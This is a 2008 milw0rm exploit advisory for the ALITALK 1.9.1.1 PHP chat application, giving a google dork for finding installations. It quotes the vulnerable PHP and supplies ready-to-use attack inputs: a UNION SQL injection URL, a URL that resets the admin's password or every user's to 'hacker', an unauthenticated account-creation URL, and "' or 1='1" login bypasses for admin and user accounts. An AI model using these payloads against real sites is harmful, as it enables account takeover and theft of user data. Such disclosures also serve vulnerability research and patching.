<html><head><title>ALITALK 1.9.1.1 Multiple Remote Vulnerabilities</title></head><pre>######################################################################
# ALITALK v 1.9.1.1 Multiple Vulnerabilities                         #
# author      : tomplixsee                                           #
# google dork : POWERED BY ALITALK                                   #
# download    : http://www.alilg.com/software/free-php-ajax-chat/    #                             
######################################################################

#################
# SQL INJECTION # 
#################
# you need to login in order to exploit this vulnerability
# vulnerable code on inc/receivertwo.php
# &lt;?
# .....
# if($_GET['turnadd']==1)
# {
# $rmusr=0;
# $rmmzyiz=mysql_query(&quot;SELECT * from &quot;.$alitalk_base['dbprefix'].&quot;users where room='&quot;.$_GET['mohit'].&quot;'&quot;);
# while ($rmuiz=mysql_fetch_array($rmmzyiz))
# {
# echo&quot;&lt;rmusj&gt;&quot;;
# echo&quot; r%#dtr onmouseout=\&quot;detailsclo()\&quot; onmouseover=\&quot;details(event,'&quot;.$rmuiz[gender].&quot;','&quot;.$rmuiz[age].&quot;','&quot;.$rmuiz[username].&quot;','&quot;.$rmuiz[location].&quot;')\&quot; ondblclick=\&quot;ums('&quot;.$rmuiz[uid].&quot;','&quot;.$rmuiz[username].&quot;','&quot;.&quot;&quot;.&quot;')\&quot; b*%d
# r%#dtd width='19'b*%d r%#dimg src=\&quot;pix/room_user.gif\&quot;b*%dr%#d/tdb*%d
# r%#dtd class='roomuser'b*%dr%#dfont unselectable='on' style=\&quot;cursor: default;\&quot;b*%d $rmuiz[username] r%#d/tdb*%d
# r%#d/trb*%d&quot;;
# $rmusr++;
# echo&quot;&lt;/rmusj&gt;&quot;;
# }
# ....
# ?&gt;
#
# example:
# http://target/path/alitalk/inc/receivertwo.php?uid=1&amp;mohit=y'+union+select+user(),2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2+from+alitalk_users+where+uid='1&amp;turnadd=1&amp;melody=0&amp;lilil=400


###########################
# PASSWORD CHANGE BYPASS  #
###########################
# vulnerable code on functionz/usercp.php
# &lt;?
# .....
# function newpass($db,$id)
# {
# $nat=md5($_GET['old'].$_GET['old']);
# $nao=md5($_GET['new'].$_GET['new']);
# $threeyiz=mysql_query(&quot;SELECT * from &quot;.$db.&quot;users where uid='&quot;.$id.&quot;' and password='&quot;.md5(md5($_GET['old']).$nat).&quot;'&quot;);
# $yiz=mysql_fetch_array($threeyiz);
# if(!$yiz)
# {
# echo &quot;Old Password is Wrong!&quot;;
# }
# else
# {
# mysql_query(&quot;UPDATE &quot;.$db.&quot;users SET password='&quot;.md5(md5($_GET['new']).$nao).&quot;' WHERE uid='&quot;.$id.&quot;'&quot;);
# mysql_query(&quot;UPDATE &quot;.$db.&quot;users SET salt='&quot;.$nao.&quot;' WHERE uid='&quot;.$id.&quot;'&quot;);
# mpl($db,$id);
# }
# }
# .....
# ?&gt;
# examples:
# http://target/path/inc/usercp.php?action=newpass&amp;id=1' or password='&amp;lilil=400&amp;new=hacker
# this will change password to &quot;hacker&quot; for user with uid = 1 (admin).
# 
# http://target/path/inc/usercp.php?action=newpass&amp;id=1' or 1='1&amp;lilil=400&amp;new=hacker
# this will change ALL passwords to &quot;hacker&quot;.


############################
# USER REGISTRATION BYPASS #
############################
# vulnerable code on inc/elementz.php:
# &lt;?
# ......
# if($_GET['lilil']!==&quot;&quot;.$_SESSION['lilol'].&quot;&quot;){return false;}
# include&quot;setting.php&quot;;
# $analuze=mysql_query(&quot;SELECT username from &quot;.$alitalk_base['dbprefix'].&quot;users where username='&quot;.$_GET['ubild'].&quot;' and type='alitalk'&quot;);
# $analuzeed=mysql_fetch_array($analuze);
# if($analuzeed)
# {
# echo &quot;Fatal Error&quot;;
# }
# else
# {
# $nat=md5($_GET['pa'].$_GET['pa']);
# $pass=md5(md5($_GET['pa']).$nat);
# mysql_query(&quot;INSERT into &quot;.$alitalk_base['dbprefix'].&quot;users (firstname,lastname,gender,age,username,password,salt,joindate,addz,type) values('&quot;.$_GET['fn'].&quot;','&quot;.$_GET['ln'].&quot;','&quot;.$_GET['gender'].&quot;','&quot;.$_GET['age'].&quot;','&quot;.$_GET['ubild'].&quot;','&quot;.$pass.&quot;','&quot;.$nat.&quot;','&quot;.date(&quot;F j, Y&quot;).&quot;','$uid','alitalk')&quot;);
# ....
# ?&gt;
# example:
# http://target/path/inc/elementz.php?lilil=400&amp;ubild=hacker&amp;pa=hacker
# this will add an account with username=hacker and password=hacker


#############################
# ADMIN LOGIN SQL INJECTION #
#############################
# code on admin/index.php
# &lt;?
# .......
# else if($_POST['signin'])
# {
# include &quot;../functionz/first_process.php&quot;;
# include &quot;../inc/setting.php&quot;;
# addin($_POST['username'],$_POST['password'],$alitalk_base['dbprefix']);
# }
# .....
# ?&gt;
# 
# vulnerable code on functionz/first_process.php
# &lt;?
# ......
# function addin($lamerz,$killer,$josh)
# {
# session_start();
# $nat=md5($killer.$killer);
# $analuze=mysql_query(&quot;SELECT * FROM &quot;.$josh.&quot;info WHERE admin='&quot;.$lamerz.&quot;' AND password='&quot;.md5(md5($killer).$nat).&quot;'&quot;);
# $analuzeed=mysql_fetch_array($analuze);
# if($analuzeed)
# {
# $_SESSION['adazsar']=1;
# ......
# ?&gt;
#
# admin login page= http://target/path/admin
# example:
#  admin ID = adminusername' or 1='1
#  password = whatever


############################
# USER LOGIN SQL INJECTION #
############################
#
# example:
#  ID = an_userID' or 1='1
#  password = whatever

# milw0rm.com [2008-01-16]</pre></html>